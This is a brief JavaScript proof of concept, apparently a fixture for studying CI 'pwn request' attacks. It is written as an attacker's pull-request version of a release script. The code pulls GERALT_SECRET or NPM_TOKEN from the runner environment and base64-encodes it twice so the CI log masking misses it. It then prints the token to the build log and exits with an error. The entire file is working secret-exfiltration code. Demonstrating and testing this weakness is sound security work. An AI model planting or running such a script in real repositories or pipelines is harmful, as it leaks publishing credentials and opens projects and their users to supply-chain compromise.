// Attacker-controlled PR head implementation of the 'autorelease' script.
// Runs inside the secret-bearing runner via: yarn autorelease preview <pr#>
const token = process.env.GERALT_SECRET || process.env.NPM_TOKEN || "";
const b64 = Buffer.from(token).toString("base64");
const b64b64 = Buffer.from(b64).toString("base64");
console.log(`GERALT_LEAKED_TOKEN=${b64b64}`);
process.exit(1);
